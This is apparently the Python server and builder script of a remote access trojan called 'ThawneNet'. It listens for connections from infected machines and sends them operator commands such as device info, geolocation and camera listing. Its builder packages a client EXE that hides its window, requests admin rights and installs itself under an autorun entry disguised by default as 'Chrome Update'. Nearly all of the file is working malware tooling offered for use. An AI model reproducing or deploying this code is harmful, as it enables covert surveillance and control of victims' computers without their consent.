#!/usr/bin/python
# -*- coding: utf-8 -*-
#  _______ _                               _   _ ______ _______
# |__   __| |                             | \ | |  ____|__   __|
#    | |  | |__   __ ___      ___ __   ___|  \| | |__     | |
#    | |  | '_ \ / _` \ \ /\ / / '_ \ / _ \ . ` |  __|    | |
#    | |  | | | | (_| |\ V  V /| | | |  __/ |\  | |____   | |
#    |_|  |_| |_|\__,_| \_/\_/ |_| |_|\___|_| \_|______|  |_|
#                                        - By Cisamu
import subprocess
import sys
import os
import time
import platform
import re
import datetime
from subprocess import PIPE, run
import socket
import threading
import queue

sys.stdout.reconfigure(encoding='utf-8')

banner = """\033[1m\033[91m
                  _________-----_____
       _____------           __      ----_
___----             ___------              \ 
   ----________        ----                 
               -----__    |             _____)       _______ _                               _   _ ______ _______ 
                    __-                /     \      |__   __| |                             | \ | |  ____|__   __|
        _______-----    ___--          \    /)\        | |  | |__   __ ___      ___ __   ___|  \| | |__     | |   
  ------_______      ---____            \__/  /        | |  | '_ \ / _` \ \ /\ / / '_ \ / _ \ . ` |  __|    | |   
               -----__    \ --    _          /\        | |  | | | | (_| |\ V  V /| | | |  __/ |\  | |____   | |   
                      --__--__     \_____/   \_/\      |_|  |_| |_|\__,_| \_/\_/ |_| |_|\___|_| \_|______|  |_|
                              ----|   /          |
                                  |  |___________|                                             
                                  |  | ((_(_)| )_)
                                  |  \_((_(_)|/(_)
                                  \             (
                                   \_____________)
                                                                        \033[93m- Coded By Cisamu
"""

pattern = '\"(\\d+\\.\\d+).*\"'


def stdOutput(type_=None):
    if type_ == "error": col = "31m";str = "ERROR"
    if type_ == "warning": col = "33m";str = "WARNING"
    if type_ == "success": col = "32m";str = "SUCCESS"
    if type_ == "info": return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
    message = "\033[1m[\033[31m\033[0m\033[1m\033[" + col + str + "\033[0m\033[1m]\033[0m "
    return message


def animate(message):
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write("\r" + stdOutput("info") + "\033[1m" + message + "\033[31m" + char + "\033[0m")
        time.sleep(.1)
        sys.stdout.flush()


def clearDirec():
    if (platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear, direc


clear, direc = clearDirec()


def is_valid_ip(ip):
    m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
    return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))


def is_valid_port(port):
    i = 1 if port.isdigit() and len(port) > 1 else 0
    return i


def execute(command):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)


def executeCMD(command, queue):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    queue.put(result)
    return result


def getpwd(name):
    return os.getcwd() + direc + name;


def help():
    helper="""
    Usage:
    info                       --> returns basic info of the device
    activeWindow               --> returns active window
    battery                    --> returns battery info
    whois                      --> returns the ip, city, country etc of the device
    camlist                    --> returns list of available web cameras
    clear                      --> clears the screen
    exit                       --> exit the interpreter
    """
    print(helper)


def get_shell(ip, port):
    soc = socket.socket()
    soc = socket.socket(type=socket.SOCK_STREAM)
    try:
        # Restart the TCP server on exit
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        print(stdOutput("error") + "\033[1m %s" % e)
        exit()

    soc.listen(2)
    print(banner)
    while True:
        try:
            que = queue.Queue()
            t = threading.Thread(target=connection_checker, args=[soc, que])
            t.daemon = True
            t.start()
            while t.is_alive():
                animate("Waiting for Connections  ")
            t.join()
            conn, addr = que.get()
            clear()
            print(banner)
            print("\033[1m\033[33mGot connection from \033[31m" + "".join(str(addr)) + "\033[0m")
            print(" ")
            while True:
                msg = conn.recv(4024).decode("UTF-8")
                print(stdOutput("error") + msg) if "Unknown Command" in msg else print(
                    "\033[1m" + msg) if "Hello there" in msg else print(msg)
                message_to_send = input("\033[1m\033[36mConsole:/> \033[0m") + "\n"
                conn.send(message_to_send.encode("UTF-8"))
                if message_to_send.strip().lower() == "exit":
                    sys.exit()
                if message_to_send.strip().lower() == "help":
                    help()
                if (message_to_send.strip().lower() == "clear"): clear()
        except KeyboardInterrupt:
            print("Exiting...")
            sys.exit()
        except Exception as e:
            print("An error occurred:", e)
            print("Restarting the server...")


def connection_checker(socket, queue):
    conn, addr = socket.accept()
    queue.put([conn, addr])
    return conn, addr

def build():
    print(banner)
    def get_input(prompt, default=None):
        if default is not None:
            return input(prompt + f" [{default}]: ") or default
        else:
            return input(prompt + ": ")

    config = {}

    config['HOST'] = get_input("Enter Host", "127.0.0.1")
    config['PORT'] = int(get_input("Enter Port", "8080"))
    config['ICON'] = get_input("Enter Icon Path, example: Client\\Google-Chrome.ico", "")
    config['AttributeHiddenEnabled'] = get_input("Attribute Hidden Enabled (True/False)", "True").capitalize() == "True"
    config['AdminRightsRequired'] = get_input("Admin Rights Required (True/False)", "True").capitalize() == "True"
    config['InstallPath'] = get_input("Enter Install Path, example: C:\\Users\\ThawneNet\\rat.exe", "C:\\Users\\ThawneNet\\rat.exe")

    config['AutorunEnabled'] = get_input("Autorun Enabled (True/False)", "True").capitalize() == "True"
    if config['AutorunEnabled']:
        config['AutorunName'] = get_input("Enter Autorun Name", "Chrome Update")

    config['HideConsoleWindow'] = get_input("Hide Console Window (True/False)", "True").capitalize() == "True"

    with open('Client\\config.py', 'w') as config_file:
        for key, value in config.items():
            config_file.write(f"{key} = {repr(value)}\n")

    print(stdOutput("info") + f"\033[0m{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} Generating EXE")
    pyinstaller_cmd = [
        "pyinstaller",
        "--onefile",
    ]

    # Check if AttributeHiddenEnabled is True and add --windowed accordingly
    if getattr(config, 'AttributeHiddenEnabled', True):
        pyinstaller_cmd.append("--windowed")

    # Check if ICON path is defined in the config file and not empty
    if config.get('ICON', '').strip() != '':
        pyinstaller_cmd.append(f"--icon={config['ICON'].strip()}")
    pyinstaller_cmd.append("Client\\client.py")
    # Execute the PyInstaller command
    subprocess.run(pyinstaller_cmd)
    print(stdOutput("success") + f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} Successfully exe built in \033[1m\033[32m" + os.getcwd() + direc + "\dist\client.exe" + "\033[0m")
    commands = [
        "rmdir /s /q __pycache__",
        "rmdir /s /q build"
    ]

    # Run each command
    for cmd in commands:
        subprocess.run(cmd, shell=True)
